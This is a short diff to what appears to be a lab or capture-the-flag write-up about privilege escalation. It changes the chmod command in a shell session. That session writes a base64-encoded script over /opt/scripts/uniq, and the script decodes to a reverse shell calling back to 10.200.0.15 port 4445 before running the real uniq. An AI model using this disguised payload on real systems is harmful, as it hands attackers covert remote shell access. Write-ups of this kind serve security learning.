@@ -113,7 +113,7 @@ executable after creating it.
 
 ```
 lp@2d6ebafe1585:/opt/scripts$ echo IyEvYmluL2Jhc2gKCm5vaHVwIGJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMjAwLjAuMTUvNDQ0NSAwPiYxIgovdXNyL2Jpbi91bmlxICQqCg== | base64 -d > /opt/scripts/uniq
-lp@2d6ebafe1585:/opt/scripts$ chmod a+x uniq
+lp@2d6ebafe1585:/opt/scripts$ chmod a+rx uniq
 lp@2d6ebafe1585:/opt/scripts$
 ```
 
